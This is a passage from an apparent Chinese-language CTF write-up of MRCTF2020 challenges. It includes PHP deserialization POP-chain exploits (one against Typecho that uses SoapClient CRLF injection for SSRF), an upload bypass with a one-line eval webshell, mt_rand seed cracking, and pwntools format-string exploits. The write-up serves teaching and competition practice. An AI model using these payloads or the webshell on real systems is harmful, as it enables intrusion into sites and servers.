组合。这也许解释了，为什么如果直接在网址上，传递\\0\\0username会报错，因为实际上并不是\\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。 BASE64 Wrapper LFIphp://filter/convert.base64-encode/resource=flag.php Exp: 123456789101112131415161718192021222324252627&lt;?php class Show{ public $source; public $str;}class Test{ public $p;}class Modifier{ protected $var; function __construct(){ $this-&gt;var=\"php://filter/convert.base64-encode/resource=flag.php\"; }}$s = new Show();$t = new Test();$r = new Modifier();$t-&gt;p = $r;$s-&gt;str = $t;$s-&gt;source = $s;var_dump(urlencode(serialize($s)));?&gt; 分析： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value);//8.触发这个include，利用php base64 wrapper 读flag } public function __invoke(){ $this-&gt;append($this-&gt;var);//7.然后会调用到这里 }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ return $this-&gt;str-&gt;source;//4.这里会调用str-&gt;source的__get 那么我们将其设置为Test对象 } public function __wakeup(){//2.如果pop是个Show,那么调用这里 if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {//3.匹配的时候会调用__toString echo \"hacker\"; $this-&gt;source = \"index.php\"; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p;//5.触发到这里 return $function();//6.()会调用__invoke,我们这里选择Modifier对象 }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);//1.反序列调用这里}else{ $a=new Show; highlight_file(__FILE__);} 构造即可 套娃在URL中GET请求当输入.或者(空格)或者_都会忽略，因此b_u_p_t,其实就是b u p t,正则的意思是必须要23333开头和结尾，但是值不能为23333，这个时候url的%0A为换行污染，可以绕过正则，且值不为23333。直接进入下一个套娃。jsfuck在控制器输出发现POST Merak。Post Merak=1即可查看源码。判断意图是模拟本地用户，这里我禁了XFF头，可以用Client-ip进行绕过即可，最后file_get_contents需要解密，exp如下 12345678910111213141516171819&lt;?phpfunction decode($v){ $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } function en_code($value){ $result = ''; for($i=0;$i&lt;strlen($value);$i++){ $result .= chr(ord($value[$i]) - $i*2); } $result = base64_encode($result); return $result;}echo en_code(\"flag.php\");?&gt; Ezauditindex页面是一个啥也没用的页面，需要扫后台，发现存在login.php为空，考虑到可能是处理后端,前端则是login.html,发现是一个简单的登录框，只有登录框想到大概率存在源码泄露，发现www.zip文件，判断登录逻辑是sql查询，没有任何过滤，可以直接万能密码，还需要输入密钥，这里产生公钥和秘钥的机制都是使用mt_rand，而这是个伪随机数，可以进行破解，知道公钥后将公钥转化成php_mt_seed格式，gayhub直接git clone，得到种子后，再将其生成12位密钥即可，具体原理:https://blog.csdn.net/crisprx/article/details/104306971exp: 123456789101112131415161718192021222324252627282930313233343536&lt;?php$str = \"KVQP0LdJKRaV3n9D\";$randStr = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; for($i=0;$i&lt;strlen($str);$i++){ $pos = strpos($randStr,$str[$i]); echo $pos.\" \".$pos.\" \".\"0 \".(strlen($randStr)-1).\" \"; //整理成方便 php_mt_seed 测试的格式 //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]}echo \"\\n\";/** *爆破得到mt_srand = 1775196155 */mt_srand(1775196155);function public_key($length = 16) { $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key;}/** * 先生成一次公钥在生成一次密钥 XuNhoueCDCGc */function private_key($length = 12) { $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;}echo public_key();echo \"\\n\";echo private_key();?&gt; 你传你🐎呢很经典的上传绕过，主要考察一下基本的上传绕过技能 利用BurpSuite修改MIME欺骗后端文件类型修改Content-Type: image/png然后就可以传任意文件后缀利用.htaccess来制作图片马 增加使用php解析的文件后缀(.jpg) AddType application/x-httpd-php .jpg 然后再写个一句话 1&lt;?php eval($_REQUEST['eki']);?&gt; 用蚁剑连上就可以了 Ezpop Revenge主要考察CMS审计能力和SSRF的应用顺着Typecho的源码搞的从Github上克隆源码，发现1.2预览版还有1.1的POP链改造了一下入口,然后套了SoapClient来SSRF 入口点 12345678910111213141516//HelloWorld/Plugin.phpif (isset($_POST['C0incid3nc3'])) { if(preg_match(\"/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\\'~^?&lt;&gt;$%]+/i\",base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo \"Not that easy.\"; } //call_user_func(\"call_user_func\",array($a,\"233\")); }class HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); }} 路由点 12//Typecho/Plugin.php Helper::addRoute(\"page_admin_action\",\"/page_admin\",\"HelloWorld_Plugin\",'action'); Pop链可以参照Exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __construct($coincidence){ $this-&gt;coincidence = $coincidence; } function __wakeup(){ $db = new Typecho_Db($this-&gt;coincidence['hello'], $this-&gt;coincidence['world']); }}class Typecho_Request{ private $_params; private $_filter; function __construct($params,$filter){ $this-&gt;_params=$params; $this-&gt;_filter=$filter; }}class Typecho_Feed{ private $_type = 'ATOM 1.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); public function addItem(array $item){ $this-&gt;_items[] = $item; }}$target = \"http://127.0.0.1/flag.php\";$post_string = '';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2');$a = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' =&gt; \"aaab\"));$payload1 = new Typecho_Request(array('screenName'=&gt;array($a,\"233\")),array('call_user_func'));$payload2 = new Typecho_Feed();$payload2-&gt;addItem(array('author' =&gt; $payload1));$exp1 = array('hello' =&gt; $payload2, 'world' =&gt; 'typecho');$exp = new HelloWorld_DB($exp1);echo serialize($exp).\"\\n\";echo urlencode(base64_encode(serialize($exp))); 可以分析内网地址 123456&lt;?phpif(!isset($_SESSION)) session_start();if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\"){ $_SESSION['flag']= \"MRCTF{Cr4zy_P0p_4nd_RCE}\";}else echo \"我扌your problem?\\nonly localhost can get flag!\";?&gt; 这也是为啥cookie要带session 用payload打一次刷新下页面var_dump()就会dumpflag出来了 Not So Web Application首先是题目说明，这玩意本来没这么恶心（没伪装加上 User 和 SQL 那个 SVG）本题主要难点在于 Web Assembly 至今没有个能用的调试器，所以需要多种手段动调+静态调试。可以先通过和其他 Qt for Web Assembly 程序比对，去掉一大半疑似函数，同时可以通过搜索字符串（Incorrect等）确定大概相关函数位置。同时通过给输入框塞入大量垃圾（&gt;64KB，wasm基本内存单位）触发内存越界错误找到变量存储位置。最终在浏览器里动调和 wasm2c 的辅助可以找到flag加密后内容和比对算法。 REXor(校内专供)异或一次后的数据再异或一次即可得到原数据将输入字符和序号进行异或，再与目标数组比较所以只需要将目标数组反过来再次异或就可以得到flag 1234567891011121314#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;cstdlib&gt;char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67};int main(){ for(int i=0;i&lt;strlen(flag);i++) { unsigned char tmp=flag[i]; tmp^=i; printf(\"%c\",tmp); } return 0;} 得到flag:MRCTF{@_R3@1ly_E2_R3verse!} Transform其实就是个简单的字符置换，可以试试输入有规律的字符串，然后dump出处理过后的字符串这样就知道置换矩阵了，拿出数据置换一下，异或一下就是flag。。 撸啊撸这道题目其实题目名有很大的提示，lua lu这个使用C++内嵌lua写的，不然为什么会显示”I need My friend to help me check your flag!”只需要根据判断逻辑逆向思考，可以看出sub_7FF650AFD980是个很重要的函数然后观察它的参数，发现出入了一个乱七八糟的字符串。看不出来是啥，但是如果动调，就会发现这个字符串被修改了，看的懂了 12345678910111213141516171819202122cmps={83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97}print(\"Give Me Your Flag LOL!:\")flag=io.read()if string.len(flag)~=29 then print(\"Wrong flag!\") os.exit()endfor i=1,string.len(flag) do local x=string.byte(flag,i) if i%2==0 then x=x~i else x=x+6 end if x~=cmps[i] then print(\"Wrong flag!\") os.exit() end endprint(\"Right flag!\")os.exit() 这里的~是异或的意思，就很容易看懂了EXP 12345678910a=[83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97]flag=\"\"for i in range(1,29): x=a[i-1] if i%2==0: x^=i else: x-=6 flag+=chr(x)print flag PixelShooter这道题目使用了Unity写的个小游戏表面上是apk，其实是个C#逆向大部分的Unity都是用C#写的，其中有个存储逻辑代码的C#二进制文件Assembly-Csharp.dll所以只要找到这个玩意就是了apk解包，PixelShooter.apk\\assets\\bin\\Data\\Managed下面就是了dnspy打开即可在UIController下找到flagMRCTF{Unity_1S_Fun_233} Junk这道题如同其名字，Junk往里面塞了很多JunkCode，只要一个个去掉就是了，U和C键交替(里面插了许多0xE8字节来迷惑IDA)顺便把一些稀里糊涂的Call给删了(通过Call一个函数，函数里修改了EIP的值，进行跳转，这会导致F5分析失败)可以仔细分析一下，这里对输入进行了异或然后实现了循环左移和右移的操作，鉴于位移四位，其实左移右移都是一样的这里还有个奇怪的函数sub_B81090，对数据进行了奇怪的操作点开看看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697char __fastcall sub_B81090(char *a1, int a2){ int v2; // eax signed int v3; // esi int v4; // edi char v5; // al unsigned __int8 v6; // ah unsigned __int8 v7; // dh unsigned __int8 v8; // bh unsigned __int8 v9; // dl signed int v10; // eax bool v11; // cf unsigned __int8 v12; // cl int i; // ecx int v15; // [esp+8h] [ebp-14h] char v16; // [esp+10h] [ebp-Ch] char v17; // [esp+11h] [ebp-Bh] char v18; // [esp+12h] [ebp-Ah] char v19; // [esp+13h] [ebp-9h] unsigned __int8 v20; // [esp+14h] [ebp-8h] unsigned __int8 v21; // [esp+15h] [ebp-7h] unsigned __int8 v22; // [esp+16h] [ebp-6h] unsigned __int8 v23; // [esp+1Bh] [ebp-1h] v2 = a2; v3 = 0; v4 = 0; if ( a2 ) { do { v15 = v2 - 1; v5 = *a1++; *(&amp;v20 + v3++) = v5; v6 = v22; v7 = v21; v8 = v20; v23 = v22; if ( v3 == 3 ) { v9 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF); v17 = (v21 &gt;&gt; 4) + 16 * (v20 &amp; 3); v18 = (v22 &gt;&gt; 6) + 4 * (v21 &amp; 0xF); v19 = v22 &amp; 0x3F; v16 = v20 &gt;&gt; 2; byte_BA1708[v4] = byte_B9EA00[v20 &gt;&gt; 2]; byte_BA1709[v4] = byte_B9EA00[(unsigned __int8)((v7 &gt;&gt; 4) + 16 * (v8 &amp; 3))]; byte_BA170A[v4] = byte_B9EA00[v9]; byte_BA170B[v4] = byte_B9EA00[v6 &amp; 0x3F]; v4 += 4; v3 = 0; } v2 = v15; } while ( v15 ); if ( v3 ) { v10 = v3; if ( v3 &gt;= 3 ) { v12 = v23; } else { v11 = (unsigned int)v3 &lt; 3; do { if ( !v11 ) { sub_B8150A(a1); JUMPOUT(*(_DWORD *)algn_B811F3); } *(&amp;v20 + v10++) = 0; v11 = (unsigned int)v10 &lt; 3; } while ( v10 &lt; 3 ); v12 = v22; v7 = v21; v8 = v20; } v16 = v8 &gt;&gt; 2; v17 = (v7 &gt;&gt; 4) + 16 * (v8 &amp; 3); LOBYTE(v2) = v12 &gt;&gt; 6; v19 = v12 &amp; 0x3F; v18 = (v12 &gt;&gt; 6) + 4 * (v7 &amp; 0xF); for ( i = 0; i &lt; v3 + 1; ++v4 ) { v2 = (unsigned __int8)*(&amp;v16 + i++); LOBYTE(v2) = byte_B9EA00[v2]; byte_BA1708[v4] = v2; } if ( v3 &lt; 3 ) LOBYTE(v2) = sub_B822E0(&amp;byte_BA1708[v4], 46, 3 - v3); } } return v2;} 不难发现就是个base64变种，不过就是把表换了一下，等于号换成点而已ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&amp;*(+/最后在和已有字符串比较所以思路很简单: 解变种base64-&gt;循环左移4位-&gt;异或3-&gt;得到flagEXP 123456789101112131415161718192021import base64orig=\"%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm%w..\"orig=orig.replace(')','0')orig=orig.replace('!','1')orig=orig.replace('@','2')orig=orig.replace('#','3')orig=orig.replace('$','4')orig=orig.replace('%','5')orig=orig.replace('^','6')orig=orig.replace('&amp;','7')orig=orig.replace('*','8')orig=orig.replace('(','9')orig=orig.replace('.','=')print origcode=base64.b64decode(orig).encode('hex')flag=\"\"for x in range(0,len(code),2): num=int(code[x:x+2],16) num=(((num&gt;&gt;4)&amp;0xff) | ((num&lt;&lt;4)&amp;0xff)) flag+=chr(num^3)print flag MRCTF{junkjunkjunkcodejunkjunkcodejunkcode} EasyCPP程序运用了较多的C++特性所以代码看起来会比较冗杂，好在给了符号总体上是要输入9个数字，并存入了Vector然后通过lambda表达式进行了每个数字异或1的操作，然后对结果调用了个depart的函数得到一个string的结果，最后和原有的9个奇怪字符串比较最后输出九个数字拼起来的字符串，flag就是要把这九个数字拼起来进行md5校验后包起来 然后来分析下depart函数和那个负责替换的lambda表达式 1234567891011121314151617181920212223242526__int64 __fastcall depart(int a1, __int64 a2, double a3){ char v4; // [rsp+20h] [rbp-60h] char v5; // [rsp+40h] [rbp-40h] int i; // [rsp+68h] [rbp-18h] int v7; // [rsp+6Ch] [rbp-14h] v7 = a1; for ( i = 2; ; ++i ) { std::sqrt&lt;int&gt;((unsigned int)a1); //枚举到根号n if ( a3 &lt; (double)i ) break; if ( !(a1 % i) ) //能分解就分解 { v7 = i; depart((unsigned int)(a1 / i), a2); //递归分解 break; } } std::__cxx11::to_string((std::__cxx11 *)&amp;v5, v7); //将数字转为字符串以空格为间隔符合并起来 std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v4, &amp;unk_500C, &amp;v5); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(a2, &amp;v4); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v4); return std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v5);} 最后那个比较函数其实就是 1234567891011replace(a.begin(),a.end(),'0','O');replace(a.begin(),a.end(),'1','l');replace(a.begin(),a.end(),'2','z');replace(a.begin(),a.end(),'3','E');replace(a.begin(),a.end(),'4','A');replace(a.begin(),a.end(),'5','s');replace(a.begin(),a.end(),'6','G');replace(a.begin(),a.end(),'7','T');replace(a.begin(),a.end(),'8','B');replace(a.begin(),a.end(),'9','q');replace(a.begin(),a.end(),' ','='); 将这些东西替换回数字，再把这些数字乘起来，再异或1一下就是输入的九个数字 12345678910234512225774247633749032245635316720MRCTF{4367FB5F42C6E46B2AF79BF409FB84D3} Shit这道题目是临时出的，其实只要过掉开局的一个死循环，也可以attach，然后dump出密钥就可以直接进行解密了，解密算法其实就是加密算法的逆向过程，全是位运算 1234567891011121314151617//key就是密钥 请直接dumpunsigned int ks[6]={0x8c2c133a,0xf74cb3f6,0xfedfa6f2,0xab293e3b,0x26cf8a2a,0x88a1f279};void decode(){ unsigned int k=0,bk=0; for(int i=5;i&gt;=0;i--) if(i&gt;0) ks[i]^=ks[i-1]; for(int i=0;i&lt;24;i+=4) { k=ks[i/4]; k=(1&lt;&lt;key[i/4])^k; k=((k&gt;&gt;16)) | ((~(k&lt;&lt;16))&amp;0xffff0000); k=((k&lt;&lt;key[i/4])) | (k&gt;&gt;(32-key[i/4])); printf(\"%X\\n\",k); }} 解密出六个int，直接转ascii就是flag Virtual Tree这道题静态分析完全就是错的，因为我在main函数运行前会将一些函数给替换掉所以静态分析完全失败的，但是似乎大部分人都是动调2333 12345678910111213141516171819202122232425262728int replace() //开局替换函数代码，{ void *addr=doit; int val=(int)addr; DWORD old; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&amp;old)==NULL) exit(0); int count=0; while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==0x00401510) *((PDWORD)val)=(DWORD)list[count++]; //将一个全是同一个call的函数替换成不一样的函数 val=val+1; } addr=main; val=(int)addr; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&amp;old)==NULL) exit(0); while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==(DWORD)walkB) { *((PDWORD)val)=(DWORD)walkA; //加密代码的替换 break; } val=val+1; }} 所以，需要动调来看代码，代码才是对的。。 1234567891011121314151617int sub_12F16F0() //具体操作就是这些加减 异或{ Add(0, 10); Xor(1, 2); Add(2, 7); Sub_abs(3, 7); Xor(4, 5); Sub_abs(6, 1); Add(7, 3); Xor(8, 7); Sub_abs(9, 8); Sub_abs(10, 7); Xor(11, 12); Sub_abs(12, 2); Xor(14, 15); return Add(15, 2);} 还有一个函数对输入进行了异或，dump出来就是了。。所以只需要将数据按照sub_12F16F0()解方程之后，在异或dump出来的数据就可以得到flag了@_7r3e_f0r_fuNN! Cryptokeyboard其实就是手机键盘每行代表当个数字键盘上的字母摁一次就是第一个以此类推。 天干地支+甲子查找到天干地支图，发现每个都对应着数字，然后甲子是60，把每个都加上60后用ascii码转下就可以了 babyRSA这题本身除了RSA考点外，还考察了模平方算法，那个Q如果硬怼是怼不出来的，必须模平方，至于模平方算法代码网上蛮多，我这就不贴了 easy_RSA比较典型的RSA套娃，分别求出p,q，利用题干中的一些函数即可求解，p：已知$\\phi(n)=(p-1)(q-1)$, $n=pq$，利用z3的solve容易求解q：已知$ed, n=pq$，可知$ed=k(p-1)(q-1)+1$，又由于$\\frac{ed-1}{n} \\leq k \\leq \\frac{ed-1}{2n}$利用这个区间，循环solve即可，exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import sympyfrom gmpy2 import invertfrom Crypto.Util.number import getPrime, long_to_bytesfrom z3 import *base = 65537def gen_prime(N): while 1: A = getPrime(N) if A % 4 == 3: break return Adef GET_P(n, F_n): p = Int('p') q = Int('q') expr = And(F_n == (p - 1) * (q - 1), n == p * q, p &gt; 0, q &gt; 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() seed2 = 2021 * res_p + 2020 * res_q if seed2 &lt; 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2)def GET_Q(n, E_D ,judge): p = Int('p') q = Int('q') for k in range(judge, judge*2): expr = And(E_D - 1 == k * (p - 1) * (q - 1), n == p * q, p &gt; 0, q &gt; 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() break seed2 = 2021 * res_p - 2020 * res_q if seed2 &lt; 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2)P_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693P_F_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740Q_n = 20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947Q_E_D = 100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201Ciphertext = 40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021if __name__ == &quot;__main__&quot;: judge = int(Q_E_D / Q_n) - 1 _E = base P = GET_P(P_n, P_F_n) Q = GET_Q(Q_n, Q_E_D, judge) _D = invert(_E, (P-1)*(Q-1)) M = pow(Ciphertext, _D, P*Q) flag = long_to_bytes(M) print(flag) real_random利用了线性同余来构造伪随机，观察发现b,c,m满足最大周期条件，故知每次以flag[t]为种子生成的随机数列的周期均为m，通过泄露的(p-1)*(q-1)可以算出m，然后减去$2^d$（记得取模）即可求解 古典密码知多少猪圈密码，圣堂武士密码，标准银河字母，且已提示都为大写字母 解密可得 FGCPFLIRTUASYON , 图片里也提示fence ，故尝试栅栏密码 每组字数为3时即可解得flag：MRCTF{CRYPTOFUN} PWNnothing_but_everything本身是简单的ROP，但是我静态编译了一下后，去了符号，所以如果想看的比较轻松，需要去找找Ubuntu下的sig文件然后ida里导入，就可以复现不少函数的样子了，或者可以结合动调，总之看懂题就很简单了，直接ROPgadget一把梭。 easy_equation（下面说的都没用，这题忘关溢出了，直接溢出就行很明显的格式化字符漏洞，但是在利用上需要一些技巧，首先是看到那个公式，用z3的solve很好算出来解是2，之后思路就很明确，将judge的值覆写成2即可，如果直接想要直接用fmstr_payload这种payload自动生成,会惊喜的发现，无法靠填充字符达到地址对齐，所以需要转换一下思路，考虑到地址的小端序存储，如果在judge_addr-1的位置存入0x200，那么judge_addr的值自然会变成0x02，于是exp（不是唯一解法，也可以正向构造）如下： 123456789from pwn import *p = process('easy_equation')judge_addr = 0x60105Cpayload = 'a' * 6 + '%' + str(0x200 - 6) + 'c%10$hn'payload += p64(judge_addr - 1)p.sendline(payload)p.interactive() spfa有一个明显的get_flag函数，发现执行该函数的条件是flag!=-1，但是程序开头已经将flag赋值为-1，并且程序内并没有涉及flag的运算，于是考虑通过溢出修改flag。查看一下bss段可以发现，flag变量在qu数组下方，相当于qu[1000]，在SPFA函数里理论可以访问并修改qu[1000]，于是需要构建特殊的图来使队列（qu数组）越界。仔细分析可以知道，SPFA算法存在一处判断错误(if(d[y] &gt;= d[x] + len[node]))，这使得如果路径中出现0环会发生死循环，节点不断入队，最后使队列溢出。所以，我们所做的，只需要构造一个0环，然后求最短路。exp： 12345678910111213141516171819202122from pwn import *p = process(&quot;./spfa&quot;)def add(a, b, c): p.sendlineafter(&quot;:\\n&quot;, str(1)) p.sendlineafter(&quot;:\\n&quot;, str(a) + &quot; &quot; + str(b) + &quot; &quot; + str(c))def query(a, b): p.sendlineafter(&quot;:\\n&quot;, str(2)) p.sendlineafter(&quot;:\\n&quot;, str(a) + &quot; &quot; + str(b))def get_flag(): p.sendlineafter(&quot;:\\n&quot;, str(3))add(1, 2, 0)add(2, 1, 0)query(1, 2)get_flag()p.interactive() Shellcode主要想考察Googlehack能力 没啥好说的直接去http://shell-storm.org/shellcode/扒个x64 shellcode下来就可以了 Shellcode Revenge主要想考察Googlehack能力 ida可以分析出提交的Shellcode要满足全为大小写和数字的限制 可以参考这篇文章 https://hama.hatenadiary.jp/entry/2017/04/04/190129 EthereumSimpleReveal本题主要考察对 solidity 和 web3 的应用。 解法一1234567pragma solidity&gt;=0.4.22;contract reveal { private string flag=&quot;some_string_here&quot;;} 根据原合约，可以看到 flag 应该在合约的前几个变量槽中，因此可以通过 web3.eth.getStorageAt(&quot;合约地址&quot;, 0) 获取存储的变量，从而解码得到flag。 解法二Etherscan 上可以看到创建合约信息，其中可以看到 flag 。 Unwanted Coin123456789101112131415161718192021222324252627282930pragma solidity &gt;=0.6.1;contract Modcoin { mapping(uint256 =&gt; bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,&quot;Not Wanted value&quot;); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); }} 原合约中两个支付函数 recvpay() 和 fallback() 都只允许接受偶数倍0.001 ether的付款，而合约的getflag函数则要求奇数倍 0.001 ether 的合约余额才可以执行（并清空合约余额），这时就需要绕过限制向合约地址发送ether，而合约自毁或挖矿产生的ether是无法拒绝的，可以通过以下自毁合约达到条件。 12345678910contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); }}","link":"/2020/04/03/MRCTF2020/"}],"tags":[{"name":"bypass canary","slug":"bypass-canary","link":"/tags/bypass-canary/"},{"name":"rce","slug":"rce","link":"/tags/rce/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"pop","slug":"pop","link":"/tags/pop/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"mrctf","slug":"mrctf","link":"/tags/mrctf/"}],"categories":[{"name":"Pwn","slug":"Pwn","link":"/categories/Pwn/"},{"name":"web","slug":"web","link":"/categories/web/"},{"name":"contest","slug":"contest","link":"/categories/contest/"}]}